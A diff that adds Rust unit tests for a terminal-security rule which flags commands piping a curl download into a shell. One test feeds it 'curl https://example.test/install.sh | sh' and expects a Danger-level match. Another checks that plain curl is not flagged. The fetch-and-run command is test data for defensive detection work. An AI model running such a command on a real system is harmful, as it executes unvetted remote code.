@@ -49,3 +49,40 @@ impl Rule for CurlPipeShellRule {
         Vec::new()
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::{CurlPipeShellRule, Rule, RuleSeverity, SessionContext};
+    use chrono::Utc;
+    use snarkterm_core::{CommandInfo, TerminalEvent};
+    use uuid::Uuid;
+
+    fn command_event(command: &str) -> TerminalEvent {
+        TerminalEvent::CommandStarted(CommandInfo {
+            id: Uuid::new_v4(),
+            session_id: Uuid::new_v4(),
+            command: command.to_string(),
+            cwd: Some("/tmp".to_string()),
+            started_at: Utc::now(),
+        })
+    }
+
+    #[test]
+    fn detects_curl_pipe_shell() {
+        let rule = CurlPipeShellRule;
+        let matches = rule.evaluate(&command_event("curl https://example.test/install.sh | sh"), &SessionContext::default());
+
+        assert_eq!(matches.len(), 1);
+        assert_eq!(matches[0].rule_id, "curl-pipe-shell");
+        assert!(matches[0].message.contains("stranger"));
+        assert!(matches!(matches[0].severity, RuleSeverity::Danger));
+    }
+
+    #[test]
+    fn ignores_plain_curl() {
+        let rule = CurlPipeShellRule;
+        let matches = rule.evaluate(&command_event("curl https://example.test"), &SessionContext::default());
+
+        assert!(matches.is_empty());
+    }
+}
